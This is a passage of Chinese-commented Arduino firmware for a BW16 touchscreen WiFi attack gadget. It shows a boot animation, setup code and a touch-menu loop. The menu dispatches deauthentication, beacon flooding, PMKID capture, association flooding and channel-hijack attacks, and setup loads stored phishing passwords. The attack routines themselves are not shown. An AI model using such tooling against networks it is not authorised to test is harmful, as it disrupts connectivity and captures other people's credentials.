  tft.fillCircle(cx + 25, cy - 5, 13, 0x0000);
  tft.fillCircle(cx + 24, cy - 4, 11, 0xFFFF);
  // 右眼虹膜
  tft.fillCircle(cx + 25, cy - 5, 7, 0xED20);   // 橙金色

  // 眼睛瞳孔 (黑色竖椭圆)
  tft.fillRect(cx - 27, cy - 10, 4, 10, 0x0000);
  tft.fillRect(cx + 23, cy - 10, 4, 10, 0x0000);

  // 眼睛高光点
  tft.fillCircle(cx - 26, cy - 7, 2, 0xFFFF);
  tft.fillCircle(cx + 24, cy - 7, 2, 0xFFFF);

  // ── 眼睛脉冲动画 ──
  for (int pulse = 0; pulse < 3; pulse++) {
    // 亮
    tft.fillCircle(cx - 25, cy - 5, 8, 0xFDA0);
    tft.fillCircle(cx + 25, cy - 5, 8, 0xFDA0);
    // 瞳孔
    tft.fillRect(cx - 27, cy - 10, 4, 10, 0x0000);
    tft.fillRect(cx + 23, cy - 10, 4, 10, 0x0000);
    delay(80);
    // 暗
    tft.fillCircle(cx - 25, cy - 5, 8, 0xED20);
    tft.fillCircle(cx + 25, cy - 5, 8, 0xED20);
    tft.fillRect(cx - 27, cy - 10, 4, 10, 0x0000);
    tft.fillRect(cx + 23, cy - 10, 4, 10, 0x0000);
    delay(80);
  }

  // ── 鼻吻部 ──
  // 吻部区域
  tft.fillCircle(cx, cy + 28, 20, 0x528A);
  // 鼻子 (倒三角)
  tft.fillTriangle(cx - 7, cy + 18,  cx + 7, cy + 18,  cx, cy + 10, 0x0000);
  // 鼻孔
  tft.fillCircle(cx - 2, cy + 17, 2, 0x18E3);
  tft.fillCircle(cx + 2, cy + 17, 2, 0x18E3);

  // ── 嘴部 ──
  tft.drawLine(cx, cy + 20, cx, cy + 38, 0x0000);
  tft.drawLine(cx - 12, cy + 38, cx, cy + 33, 0x0000);
  tft.drawLine(cx + 12, cy + 38, cx, cy + 33, 0x0000);

  // ── 脸颊毛发 ──
  tft.drawLine(cx - 50, cy + 15, cx - 42, cy + 25, 0x528A);
  tft.drawLine(cx - 48, cy + 22, cx - 40, cy + 30, 0x528A);
  tft.drawLine(cx + 50, cy + 15, cx + 42, cy + 25, 0x528A);
  tft.drawLine(cx + 48, cy + 22, cx + 40, cy + 30, 0x528A);

  delay(300);

  // ── Phase 4: 标题文字渐显 ──
  // 清除狼头下方区域
  tft.fillRect(0, 195, 240, 60, 0x0000);

  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setBackgroundColor(0x0000);

  // "狼魂" — 渐显 (0xED20 = 橙)
  const char* title = "狼  魂";
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(title);
  for (int alpha = 1; alpha <= 5; alpha++) {
    uint16_t tc = (alpha < 3) ? 0x528A : (alpha < 5) ? 0xFCA0 : 0xED20;
    u8g2_for_adafruit_gfx.setForegroundColor(tc);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 215);
    u8g2_for_adafruit_gfx.print(title);
    delay(120);
  }

  // "BW16-AirReapr" — 渐显
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  const char* sub = "BW16-AirReapr";
  int sw = u8g2_for_adafruit_gfx.getUTF8Width(sub);
  for (int alpha = 1; alpha <= 4; alpha++) {
    uint16_t sc = (alpha < 2) ? 0x39A7 : (alpha < 3) ? 0x6B4D : (alpha < 4) ? 0xA534 : 0xEF5B;
    u8g2_for_adafruit_gfx.setForegroundColor(sc);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - sw) / 2, 238);
    u8g2_for_adafruit_gfx.print(sub);
    delay(100);
  }

  delay(200);

  // ── Phase 5: 版本文字 ──
  u8g2_for_adafruit_gfx.setForegroundColor(0x8410);
  const char* ver = "狼魂 · TFT专用固件";
  int vw = u8g2_for_adafruit_gfx.getUTF8Width(ver);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - vw) / 2, 258);
  u8g2_for_adafruit_gfx.print(ver);

  delay(200);

  // ── Phase 6: 加载进度条 ──
  const int barY = 275, barH = 6, barW = 180, barX = (SCREEN_WIDTH - barW) / 2;
  tft.drawRect(barX - 1, barY - 1, barW + 2, barH + 2, 0x4208);
  for (int p = 0; p <= barW; p += 2) {
    // 渐变颜色：从暗橙到亮橙
    uint16_t barColor = (p < barW / 3) ? 0x7A40 : (p < barW * 2 / 3) ? 0xEC40 : 0xFDA0;
    tft.fillRect(barX, barY, p, barH, barColor);
    delay(8);
  }

  // 进度条两端装饰点
  tft.fillCircle(barX, barY + barH / 2, 4, 0xED20);
  tft.fillCircle(barX + barW, barY + barH / 2, 4, 0xED20);

  // ── Phase 7: "系统启动中..." ──
  u8g2_for_adafruit_gfx.setForegroundColor(0x7BEF);
  const char* booting = "系统启动中...";
  int bw = u8g2_for_adafruit_gfx.getUTF8Width(booting);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - bw) / 2, 298);
  u8g2_for_adafruit_gfx.print(booting);
  delay(400);

  // ── Phase 8: 闪烁过渡到主菜单 ──
  tft.fillRect(0, 200, SCREEN_WIDTH, 120, 0x0000);
  delay(150);
  tft.fillRect(0, 140, SCREEN_WIDTH, 180, 0x0000);
  delay(150);
  tft.fillScreen(0x0000);
  delay(100);
}

// ==================== 初始化 ====================
void setup() {
  // 初始化SPI片选引脚（共用SPI总线）
  pinMode(TFT_CS, OUTPUT);
  digitalWrite(TFT_CS, HIGH);    // TFT不选中
  pinMode(TOUCH_CS, OUTPUT);
  digitalWrite(TOUCH_CS, HIGH);  // 触摸不选中

  Serial.begin(115200);
  delay(100);
  Serial.println("\n=== BW16 WIFI 中文触摸菜单 ===");

  // ★ 初始化EEPROM Flash存储 (BW16/AmebaD 必须先调用 begin)
  EEPROM.begin(4096);
  Serial.println("EEPROM Flash 存储已初始化 (4096 bytes)");

  // 背光 PWM
  brightnessLoad();
  pinMode(TFT_LED, OUTPUT);
  brightnessApply();
 
  //自动熄屏：默认30秒（需进菜单开启）
  autoSleepLoad();
 
  g_lastActivityMs = millis();

  // 初始化TFT (tft.begin() 内部会初始化硬件SPI)
  tft.begin();
  tft.setRotation(0);
  Serial.println("TFT 已初始化");

  // 初始化U8g2 (使用 u8g2_font_wqy12_t_gb2312 中文字体)
  u8g2_for_adafruit_gfx.begin(tft);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  Serial.println("U8g2 中文字体已加载");

  // ── 狼魂 BW16-AirReapr 专用开机动画 ──
  drawWolfBootAnimation();

  // 从EEPROM加载触摸校准数据
  bool hasCalib = loadCalibrationFromEEPROM();
  Serial.println("触摸屏幕初始化完成");

  // 加载已保存的钓鱼密码
  phishLoadPasswords();

  // EEPROM无有效校准数据 → 首次开机自动进入触摸校准
  if (!hasCalib) {
    Serial.println("[开机] 未检测到有效校准数据，自动进入触摸校准...");
    tft.fillScreen(COLOR_BG);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
    const char* msg = "首次使用，需触摸校准";
    int mw = u8g2_for_adafruit_gfx.getUTF8Width(msg);
    u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - mw) / 2, 150);
    u8g2_for_adafruit_gfx.print(msg);
    delay(1500);
    homeActionTouchCalibrate(true);  // 跳过提示，直接开始4点校准
    // 校准完成后画菜单
  }

  drawMenuUI();

  // 初始化WiFi AP模式
  Serial.println("启动WiFi AP模式...");
  char channelStr[4];
  snprintf(channelStr, sizeof(channelStr), "%d", current_channel);
  if (WiFi.apbegin(ssid_buf, pass_buf, channelStr)) {
    Serial.println("WiFi AP模式启动成功!");
  } else {
    Serial.println("WiFi AP模式启动失败!");
  }

  // 启动时执行一次扫描（仅串口输出，不跳转列表屏）
  Serial.println("执行初始WiFi扫描...");
  scanNetworks(false);

  Serial.println("系统启动完成");
  Serial.print("当前选中: ");
  Serial.println(menuItems[currentSelection]);
}

// ==================== 主循环 ====================
void loop() {
  // ===== 喂狗（每次主循环迭代必须刷新，防止意外复位）=====

  // === Web配置后台运行 ===
  if (g_webConfigRunning) {
    webConfigHandleWeb();  // 处理HTTP请求
  }

  // === 下载热点后台运行 ===
  if (g_downloadApRunning) {
    downloadHandleWeb();  // 处理HTTP请求（含PCAP下载）
  }

  static bool     wasTouched = false;   // 上一帧是否触摸
  static int16_t  lastTx = 0, lastTy = 0;

  int16_t tx, ty;
  bool touched = touch_read(&tx, &ty);

  // === 延迟绘制（避免弹窗嵌套全屏绘制导致栈/SPI/触摸状态崩溃）===
  if (g_pendingWifiDraw || g_pendingAttackMenuDraw || g_pendingMenuDraw) {
    // 先清触：弹窗返回后可能残留触摸状态，防止新画面被误触
    g_touchValid = false;
    wasTouched   = false;
    // 超时 300ms：防止用户持续按着屏幕导致无限循环 → WDT复位
    { int16_t dx, dy; unsigned long tm = millis(); while (touch_read(&dx, &dy) && (millis() - tm) < 300) delay(10); }

    if (g_pendingWifiDraw) {
      g_pendingWifiDraw = false;
      drawWiFiListScreen();
    }
    if (g_pendingAttackMenuDraw) {
      g_pendingAttackMenuDraw = false;
      drawAttackMenuUI();
    }
    if (g_pendingMenuDraw) {
      g_pendingMenuDraw = false;
      drawMenuUI();
    }

    // 本次帧不再处理触摸，防止半释放事件被误判为新点击
    wasTouched = true;
    delay(30);
    return;
  }

  // === 自动熄屏：熄屏状态下检测触摸唤醒 ===
  if (g_screenSleeping) {
    if (touched) {
      brightnessApply();            // 恢复背光
      g_screenSleeping = false;
      g_lastActivityMs = millis();
      wasTouched = false;
      Serial.println("[熄屏] 触摸唤醒");
    }
    delay(30);
    return;
  }

  // === 自动熄屏：无操作超时熄屏 ===
  if (!touched) {
    wasTouched = false;

    // 雷达自动刷新
    if (g_screen == SCREEN_RADAR && (millis() - g_lastRadarScan > RADAR_SCAN_INTERVAL)) {
      scan_results.clear();
      g_scanDone = false;
      if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
        unsigned long scanStart = millis();
        while (!g_scanDone && (millis() - scanStart) < 2000) { delay(10); }
      }
      selectedFlags.assign(scan_results.size(), 0);  // 同步尺寸，防止后续越界
      g_lastRadarScan = millis();
      redrawRadarContent();
      Serial.println("[雷达] 自动刷新, AP数: " + String(scan_results.size()));
    }

    if (g_autoSleepSec > 0 && (millis() - g_lastActivityMs > (unsigned long)g_autoSleepSec * 1000)) {
      digitalWrite(TFT_LED, LOW);   // 关闭背光
      g_screenSleeping = true;
      Serial.println("[熄屏] " + String(g_autoSleepSec) + "秒无操作，自动熄屏");
    }
    delay(30);
    return;
  }

  // 有触摸 → 刷新活动时间
  g_lastActivityMs = millis();

  // 正在触摸但去抖期内 → 不处理，等待释放
  if (wasTouched && tx == lastTx && ty == lastTy) {
    delay(30);
    return;
  }

  // 记住本次坐标
  lastTx = tx;
  lastTy = ty;

  // 触摸释放后首次检测（wasTouched=false → 新按下的第一帧）
  // 注意：去抖机制在 touch_read() 内部已处理，这里只需处理动作
  if (wasTouched) {
    // 已处理过，跳过（等待坐标变化或释放）
    delay(30);
    return;
  }

  wasTouched = true;

  if (g_screen == SCREEN_MAIN) {
    // ===== 主菜单模式 =====
    AreaType area = checkTouchArea(tx, ty);

    switch (area) {
      case AREA_BTN_UP:
        if (currentSelection > 0) {
          currentSelection--;
          updateMainMenuSelection();
          Serial.print("选中: ");
          Serial.println(menuItems[currentSelection]);
        }
        break;

      case AREA_BTN_DOWN:
        if (currentSelection < MENU_COUNT - 1) {
          currentSelection++;
          updateMainMenuSelection();
          Serial.print("选中: ");
          Serial.println(menuItems[currentSelection]);
        }
        break;

      case AREA_BTN_OK:
        showConfirmPopup(currentSelection);
        break;

      case AREA_BTN_BACK:
        Serial.println("返回上一级");
        break;

      case AREA_MENU: {
        // 主菜单禁用直接点击跳选：避免误触跳项（使用上/下按钮精确导航）
        // 仅保留已选中项的二次触摸 → 弹出确认窗口
        int visibleIdx = (ty - MENU_AREA_Y) / MENU_ITEM_H;
        int idx = g_menuScrollOffset + visibleIdx;
        if (visibleIdx >= 0 && visibleIdx < MENU_VISIBLE && idx < MENU_COUNT) {
          if (idx == currentSelection) {
            showConfirmPopup(idx);
          }
          // else: 不改变 currentSelection，忽略误触
        }
        break;
      }

      default:
        break;
    }
  } else if (g_screen == SCREEN_ATTACK_MENU) {
    // ===== 攻击子菜单模式 =====
    AreaType area = checkTouchArea(tx, ty);

    switch (area) {
      case AREA_BTN_UP:
        if (g_attackMenuIdx > 0) {
          g_attackMenuIdx--;
          updateAttackMenuSelection();
          Serial.print("[攻击] 选中: ");
          Serial.println(attackMenuItems[g_attackMenuIdx]);
        }
        break;

      case AREA_BTN_DOWN:
        if (g_attackMenuIdx < ATTACK_MENU_COUNT - 1) {
          g_attackMenuIdx++;
          updateAttackMenuSelection();
          Serial.print("[攻击] 选中: ");
          Serial.println(attackMenuItems[g_attackMenuIdx]);
        }
        break;

      case AREA_BTN_OK: {
        // ★ 如果已有选中目标 → 直接执行攻击，不重复进入WiFi列表
        if (hasSelectedTargets() && g_attackMenuIdx >= 0 && g_attackMenuIdx <= 6) {
          executeAttack(g_attackMenuIdx);
          return;
        }
        switch (g_attackMenuIdx) {
          case 0: Serial.println("[攻击] 解除身份认证 → 进入WiFi列表选目标"); gotoWifiListForAttack(0, SCREEN_ATTACK_MENU, 0);  return;  // return 防止同帧 ghost touch 污染WiFi列表
          case 1: Serial.println("[攻击] 信标帧泛洪 → 进入WiFi列表选目标");   gotoWifiListForAttack(1, SCREEN_ATTACK_MENU, 1);  return;
          case 2: Serial.println("[攻击] 信标帧+解除认证 → 进入WiFi列表选目标"); gotoWifiListForAttack(2, SCREEN_ATTACK_MENU, 2); return;
          case 3: Serial.println("[攻击] PMKID捕获 → 进入WiFi列表选目标");     gotoWifiListForAttack(3, SCREEN_ATTACK_MENU, 3);  return;
          case 4: Serial.println("[攻击] 认证关联洪水 → 进入WiFi列表选目标");   gotoWifiListForAttack(4, SCREEN_ATTACK_MENU, 4); return;
          case 5: Serial.println("[攻击] CSA信道劫持 → 进入WiFi列表选目标");    gotoWifiListForAttack(5, SCREEN_ATTACK_MENU, 5);    return;
          case 6: Serial.println("[攻击] 全广播解除认证 → 进入WiFi列表选目标"); gotoWifiListForAttack(6, SCREEN_ATTACK_MENU, 6); return;
          case 7: // 《 返回 》
            g_screen = SCREEN_MAIN;
            currentSelection = 1;
            drawMenuUI();
            Serial.println("[攻击] 返回主菜单");
            break;
        }
        break;
      }

      case AREA_BTN_BACK:
        g_screen = SCREEN_MAIN;
        currentSelection = 1;
        drawMenuUI();
        Serial.println("[攻击] 返回主菜单");
        break;

      case AREA_MENU:
        // 攻击菜单禁用直接点击跳选/执行：使用上/下+确认按钮精确操作
        break;

      default:
        break;
    }
  } else if (g_screen == SCREEN_SETTINGS) {
    // ===== 系统设置模式 =====
    AreaType area = checkTouchArea(tx, ty);

    switch (area) {
      case AREA_BTN_UP:
        if (g_settingsIdx == 0) {
          // 切换熄屏时间（向上 = 时间递增）
          g_autoSleepOptIdx = (g_autoSleepOptIdx + 1) % AUTOSLEEP_OPT_COUNT;
          g_autoSleepSec = autosleepOpts[g_autoSleepOptIdx];
          autoSleepSave();
          drawSingleSettingsItem(0, true);  // 仅重绘该项（标签变更，选中未变）
        } else if (g_settingsIdx > 0) {
          g_settingsIdx--;
          updateSettingsSelection();
        }
        break;

      case AREA_BTN_DOWN:
        if (g_settingsIdx == 0) {
          // 切换熄屏时间（向下 = 时间递减）
          g_autoSleepOptIdx = (g_autoSleepOptIdx - 1 + AUTOSLEEP_OPT_COUNT) % AUTOSLEEP_OPT_COUNT;
          g_autoSleepSec = autosleepOpts[g_autoSleepOptIdx];
          autoSleepSave();
          drawSingleSettingsItem(0, true);  // 仅重绘该项（标签变更，选中未变）
        } else if (g_settingsIdx < SETTINGS_COUNT - 1) {
          g_settingsIdx++;
          updateSettingsSelection();
        }
        break;

      case AREA_BTN_OK:
        switch (g_settingsIdx) {
          case 0:  // 熄屏时间 — 确认 = 切到下一项
            g_autoSleepOptIdx = (g_autoSleepOptIdx + 1) % AUTOSLEEP_OPT_COUNT;
            g_autoSleepSec = autosleepOpts[g_autoSleepOptIdx];
            autoSleepSave();
            drawSingleSettingsItem(0, true);  // 仅重绘该项（标签变更，选中未变）
            Serial.println("[熄屏] 自动熄屏: " + String(autosleepLabels[g_autoSleepOptIdx]));
            break;
          case 1:  // 屏幕亮度
            brightnessAdjustUI();
            drawSettingsUI();
            break;
          case 2: {  // 关于本机
            // 简易关于弹窗
            tft.fillScreen(COLOR_BG);
            tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
            u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
            u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
            u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
            int tw2 = u8g2_for_adafruit_gfx.getUTF8Width("关于本机");
            u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw2) / 2, 28);
            u8g2_for_adafruit_gfx.print("关于本机");
            u8g2_for_adafruit_gfx.setForegroundColor(0xFFE0);
            u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
            u8g2_for_adafruit_gfx.setCursor(20, 80);
            u8g2_for_adafruit_gfx.print("BW16 WiFi Pen Test Tool");
            u8g2_for_adafruit_gfx.setCursor(20, 110);
            u8g2_for_adafruit_gfx.print("固件: TFT v1.0");
            u8g2_for_adafruit_gfx.setCursor(20, 140);
            u8g2_for_adafruit_gfx.print("芯片: RTL8720DN");
            u8g2_for_adafruit_gfx.setCursor(20, 170);
            u8g2_for_adafruit_gfx.print("触屏任意位置返回");
            while (true) {
                        int16_t tx2, ty2;
              if (touch_read(&tx2, &ty2)) {
                while (touch_read(&tx2, &ty2)) delay(10);
                break;
              }
              delay(30);
            }
            drawSettingsUI();
            break;
          }
          case 3:  // 返回
            g_screen = SCREEN_MAIN;
            currentSelection = 13;
            drawMenuUI();
            Serial.println("[设置] 返回主菜单");
            return;
        }
        break;

      case AREA_BTN_BACK:
        g_screen = SCREEN_MAIN;
        currentSelection = 13;
        drawMenuUI();
        Serial.println("[设置] 返回主菜单");
        return;

      case AREA_MENU: {
        int idx = (ty - MENU_AREA_Y) / (MENU_ITEM_H + 8);
        if (idx >= 0 && idx < SETTINGS_COUNT) {
          if (idx == g_settingsIdx) {
            // 确认执行 — 递归调用上方的 AREA_BTN_OK 逻辑
            // 直接内联执行对应case
            switch (idx) {
              case 0:  // 熄屏时间 — 确认 = 切到下一项
                g_autoSleepOptIdx = (g_autoSleepOptIdx + 1) % AUTOSLEEP_OPT_COUNT;
                g_autoSleepSec = autosleepOpts[g_autoSleepOptIdx];
                autoSleepSave();
                drawSingleSettingsItem(0, true);  // 仅重绘该项（标签变更，选中未变）
                Serial.println("[熄屏] 自动熄屏: " + String(autosleepLabels[g_autoSleepOptIdx]));
                break;
              case 1: brightnessAdjustUI(); drawSettingsUI(); break;
              case 2: Serial.println("[设置] 关于本机"); break;
              case 3:
                g_screen = SCREEN_MAIN;
                currentSelection = 13;
                drawMenuUI();
                Serial.println("[设置] 返回主菜单");
                return;
            }
            drawSettingsUI();
          } else {
            g_settingsIdx = idx;
            updateSettingsSelection();
          }
        }
        break;
      }

      default:
        break;
    }
  } else if (g_screen == SCREEN_ATTACK_RUNNING) {
    // ===== 攻击运行中（安全兜底，正常由攻击内部while循环处理）=====
    g_touchValid = false;  // 清除残留触摸
    delay(300);            // 等待触摸释放
    g_attackStop = true;
    g_attackRunningType = -1;
    g_screen = SCREEN_MAIN;
    currentSelection = 1;
    g_pendingMenuDraw = true;  // 延迟绘制，避免 SPI 重入崩溃
  } else if (g_screen == SCREEN_RADAR) {
    // ===== 无线雷达模式 =====
    AreaType area = checkTouchArea(tx, ty);
    if (area == AREA_BTN_BACK) {
      g_screen = SCREEN_MAIN;
      currentSelection = 9;
      drawMenuUI();
      Serial.println("[雷达] 返回主菜单");
    } else if (area == AREA_BTN_UP) {
      // 刷新按钮 (映射到UP位置)
      scan_results.clear();
      g_scanDone = false;
      if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
        unsigned long scanStart = millis();
        while (!g_scanDone && (millis() - scanStart) < 2000) delay(10);
      }
      selectedFlags.assign(scan_results.size(), 0);  // 同步尺寸，防止后续越界
      g_lastRadarScan = millis();
      redrawRadarContent();
      Serial.println("[雷达] 手动刷新, AP数: " + String(scan_results.size()));
    }
  } else if (g_screen == SCREEN_WEB_CONFIG) {
    // ===== Web配置状态界面 =====
    // 底部居中"停止热点"按钮（x=60~179）→ 停止服务
    AreaType area = checkTouchArea(tx, ty);
    if (area == AREA_BTN_OK || area == AREA_BTN_DOWN) {
      stopWebConfig();
      g_touchValid = false;
      { int16_t dx, dy; unsigned long tm = millis(); while (touch_read(&dx, &dy) && (millis() - tm) < 300) delay(10); }
    }
  } else if (g_screen == SCREEN_DOWNLOAD_AP) {
    // ===== 抓包下载热点状态界面 =====
    // 底部居中"停止热点"按钮（x=60~179）→ 停止下载热点
    AreaType area = checkTouchArea(tx, ty);
    if (area == AREA_BTN_OK || area == AREA_BTN_DOWN) {
      stopDownloadAp();
      g_touchValid = false;
      { int16_t dx, dy; unsigned long tm = millis(); while (touch_read(&dx, &dy) && (millis() - tm) < 300) delay(10); }
    }
  } else {
    // ===== WiFi 列表模式 =====
    WifiTouchResult wr = checkWifiTouchArea(tx, ty);
    if (wr.area != WIFI_AREA_NONE) {
      handleWifiListTouch(wr);
    }
  }

  delay(30);
}
